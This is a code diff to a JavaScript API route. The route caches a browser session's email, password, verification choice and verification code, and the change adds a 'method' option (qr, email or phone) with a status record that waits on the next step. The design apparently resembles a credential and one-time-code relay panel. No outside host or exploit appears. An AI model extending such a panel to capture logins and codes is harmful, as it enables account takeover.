@@ -18,7 +18,7 @@ export async function POST(request) {
     const body = parseBody(text);
     if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);
 
-    const { browserId, token, updateType, email, password, verificationChoice, verificationCode } = body;
+    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, method } = body;
 
     if (!browserId) {
         return corsJson({ success: false, error: "browserId required" }, 400);
@@ -40,6 +40,26 @@ export async function POST(request) {
         updates.verificationChoice = verificationChoice;
     } else if (updateType === 'verificationCode' && verificationCode) {
         updates.verificationCode = verificationCode;
+    } else if (updateType === 'method') {
+        const normalized = String(method || '').trim().toLowerCase();
+        if (!['qr', 'email', 'phone'].includes(normalized)) {
+            return corsJson({ success: false, error: "Invalid method — expected qr|email|phone" }, 400);
+        }
+        const row = getCachedRow(browserId);
+        let prior = {};
+        try {
+            const raw = row?.lastJsonResponse;
+            prior = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : {};
+        } catch (e) { prior = {}; }
+        updates.loginMethod = normalized;
+        updates.lastJsonResponse = JSON.stringify({
+            browserId,
+            status: row?.status || prior.status || 'WAITING',
+            platform: prior.platform || '',
+            loginMethod: normalized,
+            timestamp: new Date().toISOString(),
+            message: `Login method set to ${normalized}`
+        });
     }
 
     setCachedRow(browserId, updates);
